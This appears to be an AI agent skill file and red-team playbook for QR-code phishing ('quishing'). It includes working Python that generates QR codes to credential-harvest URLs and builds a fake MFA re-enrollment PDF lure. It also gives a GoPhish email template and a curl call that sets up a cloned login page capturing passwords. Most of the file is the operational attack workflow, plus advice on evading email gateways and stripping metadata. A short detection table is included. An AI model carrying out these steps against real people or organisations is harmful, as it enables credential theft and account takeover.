---
name: quishing
description: "QR-code phishing (Quishing) — generate QR lures embedding credential-harvest URLs, embed in PDF or email bodies, bypass email gateway URL scanners that cannot parse QR image payloads."
allowed-tools: Bash Read Write
metadata:
  subdomain: phishing
  when_to_use: "quishing qr code phishing qr lure credential harvest bypass url scanner qr pdf email attachment evilqr gophish qr"
  mitre_attack:
    - T1566.001
    - T1204.001
    - T1598.003
  tags:
    - phishing
    - quishing
    - qr-code
    - credential-harvest
---

# QR-Code Phishing (Quishing)

Email gateway URL scanners parse hyperlinks and anchor tags — they
rarely decode QR codes embedded as images. A QR code pointing at a
credential-harvest page survives gateway scanning that would flag the
same URL in plaintext. Quishing is now the primary bypass for
organisations running Proofpoint / Mimecast / Microsoft Defender URL
detonation.

## Prerequisites

- Python `qrcode` + `Pillow` in the sandbox (`pip install qrcode[pil]`).
- GoPhish campaign infrastructure configured (`gophish-campaign`).
- A credential-harvest landing page hosted on a `lookalike-domain`.
- The `lure-deconfliction` handshake COMPLETE for this campaign.
- Optional: EvilQR for dynamic QR payloads with real-time URL rotation.

## Quick Reference

```bash
# Generate a basic QR code pointing at the harvest URL
python3 -c "
import qrcode
img = qrcode.make('https://login.<LURE_DOMAIN>/auth?id={{.RId}}')
img.save('/tmp/qr_lure.png')
"

# Generate with branding (logo overlay, colours)
python3 << 'PYEOF'
import qrcode
from qrcode.image.styledpil import StyledPilImage
from qrcode.image.styles.moduledrawers import RoundedModuleDrawer
from qrcode.image.styles.colormasks import RadialGradiantColorMask

qr = qrcode.QRCode(error_correction=qrcode.constants.ERROR_CORRECT_H)
qr.add_data('https://login.<LURE_DOMAIN>/auth?id={{.RId}}')
img = qr.make_image(
    image_factory=StyledPilImage,
    module_drawer=RoundedModuleDrawer(),
    color_mask=RadialGradiantColorMask(
        back_color=(255, 255, 255),
        center_color=(0, 51, 153),
        edge_color=(0, 102, 204),
    ),
)
img.save('/tmp/qr_branded.png')
PYEOF
```

## MITRE ATT&CK Mapping

| Technique | ID | Usage |
|---|---|---|
| Phishing: Spearphishing Attachment | T1566.001 | QR code image embedded in PDF / DOCX / email body |
| User Execution: Malicious Link | T1204.001 | Victim scans QR, phone browser opens harvest URL |
| Phishing for Information: Spearphishing Link | T1598.003 | Credential capture page behind the QR URL |

## 1. QR Code Generation

Generate the QR PNG at error-correction level H (30% redundancy) so a
centre logo can overlay up to 30% of modules without breaking decode:

```python
import qrcode

HARVEST_URL = "https://login.<LURE_DOMAIN>/auth?id=<TRACKING_ID>"

qr = qrcode.QRCode(
    version=None,           # auto-size
    error_correction=qrcode.constants.ERROR_CORRECT_H,
    box_size=10,
    border=4,
)
qr.add_data(HARVEST_URL)
qr.make(fit=True)
img = qr.make_image(fill_color="black", back_color="white")
img.save("/workspace/qr_lure.png")
```

To overlay a corporate logo in the centre (improves trust cues):

```python
from PIL import Image

qr_img = Image.open("/workspace/qr_lure.png").convert("RGBA")
logo = Image.open("/workspace/target_logo.png").resize((60, 60))
pos = ((qr_img.size[0] - logo.size[0]) // 2,
       (qr_img.size[1] - logo.size[1]) // 2)
qr_img.paste(logo, pos, logo)
qr_img.save("/workspace/qr_branded.png")
```

## 2. Embedding in PDF

Build a PDF that mimics an IT notice (MFA re-enrollment, password
policy update) with the QR image inline. The PDF body contains no
clickable URL — only the image — so URL scanners see nothing.

```python
from fpdf import FPDF

pdf = FPDF()
pdf.add_page()
pdf.set_font("Helvetica", "B", 16)
pdf.cell(0, 10, "Action Required: MFA Re-Enrollment", ln=True, align="C")
pdf.ln(8)
pdf.set_font("Helvetica", "", 11)
pdf.multi_cell(0, 6,
    "Our identity provider requires all employees to re-enroll their "
    "MFA token by <DEADLINE>. Scan the QR code below with your mobile "
    "device to complete the process.")
pdf.ln(6)
pdf.image("/workspace/qr_branded.png", x=65, w=80)
pdf.ln(6)
pdf.set_font("Helvetica", "I", 9)
pdf.cell(0, 6, "IT Security — Do not forward this document.", align="C")
pdf.output("/workspace/mfa_reenroll.pdf")
```

## 3. Embedding in Email Body (Inline Image)

Attach the QR as an inline CID image so it renders inside the email
body rather than as a downloadable attachment:

```bash
# GoPhish template HTML — embed the QR as a CID-referenced inline image
cat > /workspace/qr_template.html << 'HTML'
<html><body style="font-family:Segoe UI,sans-serif;">
<p>Dear {{.FirstName}},</p>
<p>Please scan the QR code below to verify your account:</p>
<p style="text-align:center;">
  <img src="cid:qr_lure" width="200" height="200" alt="QR Code" />
</p>
<p style="font-size:11px;color:#666;">
  IT Security Team — <TARGET_ORG><br/>
  {{.Tracker}}
</p>
</body></html>
HTML
```

When sending via GoPhish, add the QR PNG as an attachment with
`Content-ID: <qr_lure>` so the CID reference resolves.

## 4. Credential-Harvest Landing Page

The QR resolves to a landing page that clones the target's SSO portal.
GoPhish captures submitted credentials and redirects to the real login:

```bash
# Minimal M365-themed harvest page for GoPhish
curl -sk -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H 'Content-Type: application/json' \
  "$GOPHISH_API/pages/" -d '{
    "name": "qr-sso-landing",
    "html": "<form method=\"POST\"><input name=\"email\" placeholder=\"Email\"/><input name=\"password\" type=\"password\" placeholder=\"Password\"/><button>Sign In</button></form>",
    "capture_credentials": true,
    "capture_passwords": true,
    "redirect_url": "https://login.microsoftonline.com"
  }'
```

## 5. EvilQR — Dynamic QR with URL Rotation

EvilQR serves a QR that proxies through a redirector, letting you
rotate the harvest URL without regenerating the QR image:

```bash
# Clone and start EvilQR
git clone https://github.com/nickvdyck/evilqr /opt/evilqr
cd /opt/evilqr
# Configure redirect target
export EVILQR_TARGET="https://login.<LURE_DOMAIN>/auth"
python3 server.py --port 8443 --cert /opt/certs/server.pem
```

Benefit: if the harvest domain is burned mid-campaign, rotate the
backend URL without re-sending the lure.

## OPSEC

- **No plaintext URL in the email body or PDF metadata** — the entire
  point is that the URL lives only inside the QR pixel data.
- **Tracking**: append a unique `?id=` per recipient so GoPhish can
  attribute scans. Use the GoPhish `{{.RId}}` template variable.
- **Mobile context**: QR scanning happens on the victim's phone, outside
  the corporate proxy / EDR. The harvest page MUST be mobile-responsive.
- **PDF metadata**: strip author / creator fields (`exiftool -all= file.pdf`)
  before attaching.
- Send rate matches `opsec_level` (stealth ≤2/h, standard ≤20/h).

## Tools & Resources

| Tool | Purpose |
|---|---|
| `qrcode` (Python) | QR image generation with styling |
| `fpdf2` (Python) | PDF creation with embedded images |
| GoPhish | Campaign orchestration, tracking, credential capture |
| EvilQR | Dynamic QR redirector with URL rotation |
| `exiftool` | Strip PDF metadata before delivery |

## Detection Signatures

| Detection | Source | Description |
|---|---|---|
| QR code in email attachment | Proofpoint TAP / Mimecast | Image-based QR decode on inbound mail |
| Mobile OAuth token from unusual geo | Azure AD sign-in logs | Sign-in from mobile IP outside corporate range |
| PDF with no clickable URLs but embedded image | Content inspection | Anomalous PDF structure (image-only, no URI objects) |
| Rapid MFA prompt after QR scan | IdP logs | Credential submission followed by MFA challenge |

## Error Handling & Edge Cases

- **QR too dense**: if the URL exceeds ~2,953 chars the QR version
  maxes out. Use a short redirect URL (≤100 chars).
- **Logo too large**: covering >30% of modules breaks decode even at
  ERROR_CORRECT_H. Keep the overlay ≤25%.
- **Email gateway decodes QR**: some advanced gateways (Abnormal, Tessian)
  now OCR / decode QR in images. Fallback: deliver the PDF as a
  password-protected ZIP attachment.
- **Victim has no camera**: include a tiny text link as fallback but
  know it will be scanned — weigh the trade-off.

## Decision Gate

```
IF target org uses advanced QR-decode email gateway (Abnormal, Tessian)
  → deliver QR inside a password-protected PDF attachment
  → provide password in a separate email or SMS pretext
ELIF target org uses standard URL-scanning gateway
  → embed QR directly in email body as inline image
ELIF engagement requires maximum stealth
  → use EvilQR dynamic redirector + URL rotation
ELSE
  → standard QR in PDF attachment via GoPhish campaign
```

## Evidence

Captured credentials → `Credential` node linked to the `User` node
with the QR tracking id. Save GoPhish campaign results under
`evidence/phisher/<campaign>-quishing.json`. Record which QR variant
was used (static / EvilQR dynamic) and the mobile user-agent string.
